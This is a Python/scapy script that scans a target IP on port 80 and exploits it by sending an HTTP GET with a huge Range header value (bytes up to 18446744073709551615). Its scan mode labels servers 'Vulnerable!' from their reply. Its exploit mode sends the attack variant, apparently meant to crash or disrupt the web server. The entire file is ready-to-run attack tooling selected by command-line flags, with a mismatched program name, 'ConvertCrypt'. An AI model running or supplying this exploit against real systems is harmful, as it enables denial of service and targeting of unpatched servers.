import codecs
import argparse
from scapy.all import *

def make_xploit(ip):
    print("[+] Wait. Exploiting Target\n")
    # SYN the target
    syn = IP(dst=ip)/TCP(dport=80,flags="S")
    syn_ack = sr1(syn, verbose=0)
    http_payload = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=18-18446744073709551615\r\n\r\n"
    pkt = IP(dst=ip)/TCP(dport=80,flags="PA",sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack,ack=syn_ack[TCP].seq + 1)/http_payload
    res = sr1(pkt, verbose=0)
    return res

def make_scan(ip):
    resultnotvulnstr = "The request has an invalid header name"
    resultvulnstr = "Requested Range Not Satisfiable"
    print("[+] Wait. Sending packets\n")
    # SYN the target
    syn = IP(dst=ip)/TCP(dport=80,flags="S")
    syn_ack = sr1(syn, verbose=0)
    http_payload = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
    pkt = IP(dst=ip)/TCP(dport=80,flags="PA",sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack,ack=syn_ack[TCP].seq + 1)/http_payload
    res = sr1(pkt, verbose=0)
    decodedres = (res[Raw].load).decode('ascii')

    if (decodedres.find(resultnotvulnstr) != -1):
        return "[+] Not Vulnerable! Possibly patched"
    elif (decodedres.find(resultvulnstr) != -1):
        return "[-] Vulnerable!"
    else:
        print(decodedres.find(resultnotvulnstr))
        print(decodedres.find(resultvulnstr))
        return "[-] No response!"

def main():
    parser = argparse.ArgumentParser(prog='ConvertCrypt', formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-t', '--target', nargs='?', help='Target')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan Target')
    parser.add_argument('-e', '--exploit', action='store_true', help='Exploit Target')
    args = parser.parse_args()

    iptarget = args.target

    if (args.scan == True):
        print("Scanning target: " + iptarget)
        print(make_scan(iptarget))

    if (args.exploit == True):
        print("Exploiting target: " + iptarget)
        print(make_xploit(iptarget))

if __name__ == '__main__':
    main()
